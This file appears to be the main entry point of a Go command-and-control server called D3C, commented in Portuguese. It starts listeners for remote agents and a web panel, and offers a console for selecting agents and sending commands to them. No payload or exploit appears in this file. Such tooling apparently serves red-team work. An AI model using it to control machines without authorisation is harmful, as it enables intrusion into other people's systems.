package main

import (
	"bufio"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"d3c/commons/interfaces"
	"d3c/server/commands"
	. "d3c/server/helpers"
	"d3c/server/listeners"
	"io"
	"log"
	"os"
	"strings"
)

var (
	agentesEmCampo    = []estruturas.Mensagem{}
	agenteSelecionado = ""
)

func main() {
	disableAuto := os.Getenv("DISABLE_AUTO_LISTENER")
	if disableAuto != "1" {
		listenerType := os.Getenv("LISTENER_TYPE")
		if listenerType == "" {
			listenerType = "http"
		}
		listenerPort := os.Getenv("LISTENER_PORT")
		if listenerPort == "" {
			listenerPort = "80"
		}
		log.Printf("Iniciando listener %s na porta %s\n", listenerType, listenerPort)
		switch listenerType {
		case "https":
			go listeners.StartHttpsListener(listenerPort, &agentesEmCampo, &agenteSelecionado)
			webPort := os.Getenv("WEB_PORT")
			if webPort == "" {
				webPort = "8080"
			}
			log.Printf("Iniciando painel web na porta %s\n", webPort)
			go listeners.StartWebListener(webPort, &agentesEmCampo, &agenteSelecionado)
		case "raw":
			go listeners.StartRawListener(listenerPort, &agentesEmCampo, &agenteSelecionado)
			webPort := os.Getenv("WEB_PORT")
			if webPort == "" {
				webPort = "8080"
			}
			log.Printf("Iniciando painel web na porta %s\n", webPort)
			go listeners.StartWebListener(webPort, &agentesEmCampo, &agenteSelecionado)
		default: // http: agente + painel web na mesma porta
			go listeners.StartHttpListener(listenerPort, &agentesEmCampo, &agenteSelecionado)
		}
	}

	if isInteractive() {
		log.Println("Modo interativo ativo.")
		cliHandler()
	}
	// Bloqueia independente do modo — cliHandler pode retornar se stdin fechar
	select {}
}

func isInteractive() bool {
	fi, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	// ModeCharDevice sozinho detecta /dev/null como positivo no Linux.
	// Pipe flag ausente + char device = TTY real.
	return (fi.Mode()&os.ModeCharDevice != 0) && (fi.Mode()&os.ModeNamedPipe == 0)
}

func cliHandler() {
	reader := bufio.NewReader(os.Stdin)
	for {
		if agenteSelecionado != "" {
			print(agenteSelecionado + "@D3C# ")
		} else {
			print("D3C> ")
		}

		comandoCompleto, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				// stdin fechou — sai do CLI, main() cai no select{}
				return
			}
			log.Println("Erro lendo stdin:", err)
			continue
		}
		comandoCompleto = strings.Trim(comandoCompleto, "\r\n")

		comandoSeparado := helpers.SeparaComando(comandoCompleto)
		comandoBase := strings.TrimSpace(comandoSeparado[0])

		if len(comandoBase) > 0 {
			comandoId := ValidaComando(comandoBase)

			mapping := map[int]interfaces.Command{
				0: commands.Default{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				1: commands.Show{ComandoCompleto: comandoCompleto, AgentesEmCampo: &agentesEmCampo},
				2: commands.Sleep{ComandoCompleto: comandoCompleto, AgenteAlvo: agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				3: commands.Select{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				4: commands.Send{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				5: commands.Get{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				6: commands.Set{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				7: commands.Start{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
			}

			mapping[comandoId].Executar()
		}
	}
}
